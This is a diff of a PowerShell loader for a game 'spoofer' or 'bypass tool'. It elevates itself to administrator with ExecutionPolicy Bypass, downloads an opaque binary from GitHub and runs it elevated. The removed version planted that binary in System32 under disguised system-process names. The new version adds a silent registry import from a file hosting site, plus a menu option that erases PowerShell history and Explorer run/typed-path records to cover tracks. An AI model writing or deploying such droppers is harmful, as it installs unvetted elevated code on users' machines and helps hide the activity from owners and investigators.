@@ -1,17 +1,25 @@
 # -----------------------------
 # Menu Selection
 # -----------------------------
-Write-Host "Hi Member Seanual X Spoofer UPDATE | 18/10/2025:"
-Write-Host "1. Install & Run"
-Write-Host "2. Clean"
+Clear-Host
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "     Saipoz Setup" -ForegroundColor Magenta
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "  [1] RUN" -ForegroundColor Green
+Write-Host "  [2] Setup two" -ForegroundColor Yellow
+Write-Host "  [3] Clear PowerShell History" -ForegroundColor Red
+Write-Host "  [4] Exit" -ForegroundColor Gray
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
 
-$choice = Read-Host "Enter choice (1/2)"
+$choice = Read-Host "`nEnter your choice (1/2/3/4)"
 
 # -----------------------------
 # Check for Administrator rights
 # -----------------------------
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
-    Write-Host "Restarting with Administrator privileges..."
+    Write-Host "`n[!] Restarting with Administrator privileges..." -ForegroundColor Yellow
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
@@ -19,84 +27,212 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 # Define paths and variables
 # -----------------------------
-$system32Path = "$env:windir\System32"
-$exeDestination = Join-Path $system32Path "RuntimeBrokerrrr.exe"
-$dllDestination = Join-Path $system32Path "Guna.UI2.dll"
+# หาโฟลเดอร์ Downloads แบบหลายวิธี
+$downloadsPath = "$env:USERPROFILE\Downloads"
+if (-not (Test-Path $downloadsPath)) {
+    $downloadsPath = [Environment]::GetFolderPath("UserDownloads")
+}
+if (-not (Test-Path $downloadsPath)) {
+    $downloadsPath = [Environment]::GetFolderPath("MyDocuments") + "\Downloads"
+}
+if (-not (Test-Path $downloadsPath)) {
+    $downloadsPath = "C:\Downloads"
+    if (-not (Test-Path $downloadsPath)) {
+        New-Item -ItemType Directory -Path $downloadsPath -Force | Out-Null
+    }
+}
+
+$exeDestination = Join-Path $downloadsPath "runbx.exe"
+$regDestination = Join-Path $env:TEMP "titanx_reg.reg"
 $exeUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/Seanual-HUB/raw/refs/heads/main/Loader.exe_VaultVM.bin"
-$dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
+$regUrl = "https://files.catbox.moe/if7ith.reg"
 
 # -----------------------------
-# Install & Run Mode
+# Option 1: Install & Run Bypass Tool
 # -----------------------------
 if ($choice -eq "1") {
-    Write-Host "`nStarting installation..."
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [1] INSTALLING BYPASS TOOL" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
 
-    # Download DLL first
-    Write-Host "Downloading Guna.UI2.dll..."
+    # Check if already exists
+    if (Test-Path $exeDestination) {
+        Write-Host "[!] File already exists in Downloads. Overwriting..." -ForegroundColor Yellow
+    }
+
+    # Download executable to Downloads
+    Write-Host "[+] Downloading runbx.exe to Downloads folder..." -ForegroundColor Cyan
+    Write-Host "[+] Target: $exeDestination" -ForegroundColor Gray
     try {
-        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination
-        Write-Host "Guna.UI2.dll download completed." -ForegroundColor Green
+        $tempFile = Join-Path $env:TEMP "titanx_temp.bin"
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -ErrorAction Stop
+        Move-Item -Path $tempFile -Destination $exeDestination -Force -ErrorAction Stop
+        Write-Host "[✓] Download completed successfully!" -ForegroundColor Green
     } catch {
-        Write-Host "Guna.UI2.dll download failed: $_" -ForegroundColor Red
+        Write-Host "[✗] Download failed: $_" -ForegroundColor Red
+        Write-Host "`nPress any key to exit..."
+        Read-Host
         exit
     }
 
-    # Download exe and rename to fontdrvhosts.exe
-    Write-Host "Downloading and renaming executable to fontdrvhosts.exe..."
-    try {
-        $tempFile = Join-Path $env:TEMP "seanual_temp.exe"
-        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
-        Move-Item -Path $tempFile -Destination $exeDestination -Force
-        Write-Host "fontdrvhosts.exe download completed." -ForegroundColor Green
-    } catch {
-        Write-Host "fontdrvhosts.exe download failed: $_" -ForegroundColor Red
-        exit
+    # Verify file exists
+    if (Test-Path $exeDestination) {
+        Write-Host "[✓] File verified: $exeDestination" -ForegroundColor Green
+        
+        # Run the executable
+        Write-Host "[+] Launching runbx.exe..." -ForegroundColor Cyan
+        try {
+            Start-Process -FilePath $exeDestination -Verb RunAs -WindowStyle Normal
+            Write-Host "[✓] Program started successfully!" -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to start program: $_" -ForegroundColor Red
+        }
+    } else {
+        Write-Host "[✗] File not found after download!" -ForegroundColor Red
     }
 
-    # Run the program directly
-    Write-Host "Starting the program..."
-    try {
-        Start-Process -FilePath $exeDestination -Verb RunAs
-        Write-Host "Program started successfully." -ForegroundColor Green
-    } catch {
-        Write-Host "Failed to start program: $_" -ForegroundColor Red
-    }
-
-    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] Installation completed!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
 }
 
 # -----------------------------
-# Clean Mode
+# Option 2: Run Registry Script
 # -----------------------------
 elseif ($choice -eq "2") {
-    Write-Host "Cleaning up installation..."
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [2] RUNNING REGISTRY SCRIPT" -ForegroundColor Yellow
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
 
-    # Stop the process if running
-    Write-Host "Stopping fontdrvhosts.exe process..."
+    # Download registry file
+    Write-Host "[+] Downloading registry script..." -ForegroundColor Cyan
     try {
-        Stop-Process -Name "fontdrvhosts" -Force -ErrorAction SilentlyContinue
-        Write-Host "Process stopped." -ForegroundColor Green
+        Invoke-WebRequest -Uri $regUrl -OutFile $regDestination -ErrorAction Stop
+        Write-Host "[✓] Registry script downloaded successfully!" -ForegroundColor Green
     } catch {
-        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+        Write-Host "[✗] Download failed: $_" -ForegroundColor Red
+        Write-Host "`nPress any key to exit..."
+        Read-Host
+        exit
     }
 
-    # Remove files if they exist
-    if (Test-Path $exeDestination) { 
-        Remove-Item $exeDestination -Force 
-        Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
+    # Verify file exists
+    if (Test-Path $regDestination) {
+        Write-Host "[✓] File verified: $regDestination" -ForegroundColor Green
+        
+        # Run registry file
+        Write-Host "[+] Applying registry changes..." -ForegroundColor Cyan
+        try {
+            Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$regDestination`"" -Wait -ErrorAction Stop
+            Write-Host "[✓] Registry script executed successfully!" -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to execute registry script: $_" -ForegroundColor Red
+        }
+
+        # Clean up temp file
+        Remove-Item $regDestination -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Cleaned up temporary files." -ForegroundColor Cyan
+    } else {
+        Write-Host "[✗] Registry file not found!" -ForegroundColor Red
     }
+
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] Registry operation completed!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
+
+# -----------------------------
+# Option 3: Clear PowerShell History
+# -----------------------------
+elseif ($choice -eq "3") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [3] CLEARING POWERSHELL HISTORY" -ForegroundColor Red
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    # Clear current session history
+    Write-Host "[+] Clearing current session history..." -ForegroundColor Cyan
+    Clear-History -Force -ErrorAction SilentlyContinue
+    Write-Host "[✓] Current session history cleared." -ForegroundColor Green
+
+    # Clear persistent history file
+    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    if (Test-Path $historyPath) {
+        Write-Host "[+] Removing persistent history file..." -ForegroundColor Cyan
+        try {
+            Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+            Write-Host "[✓] Persistent history file removed." -ForegroundColor Green
+        } catch {
+            Write-Host "[!] Could not remove history file." -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "[!] No persistent history file found." -ForegroundColor Yellow
+    }
+
+    # Clear recent PowerShell run commands from registry
+    Write-Host "[+] Clearing PowerShell run commands from registry..." -ForegroundColor Cyan
+    $regPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
+    )
     
-    if (Test-Path $dllDestination) { 
-        Remove-Item $dllDestination -Force 
-        Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
+    foreach ($path in $regPaths) {
+        if (Test-Path $path) {
+            try {
+                Remove-Item -Path "$path\*" -Force -ErrorAction SilentlyContinue
+                Write-Host "[✓] Cleared: $path" -ForegroundColor Green
+            } catch {
+                Write-Host "[!] Could not clear: $path" -ForegroundColor Yellow
+            }
+        }
     }
 
-    Write-Host "Cleanup completed." -ForegroundColor Green
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] PowerShell history cleared successfully!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
 }
 
+# -----------------------------
+# Option 4: Exit
+# -----------------------------
+elseif ($choice -eq "4") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "     THANK YOU FOR USING TITANX TOOL" -ForegroundColor Magenta
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nExiting... Goodbye!" -ForegroundColor Green
+    Start-Sleep -Seconds 2
+    exit
+}
+
+# -----------------------------
+# Invalid Choice
+# -----------------------------
 else {
-    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
-
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "     INVALID CHOICE!" -ForegroundColor Red
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPlease select 1, 2, 3, or 4 only." -ForegroundColor Yellow
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
 }
-
-
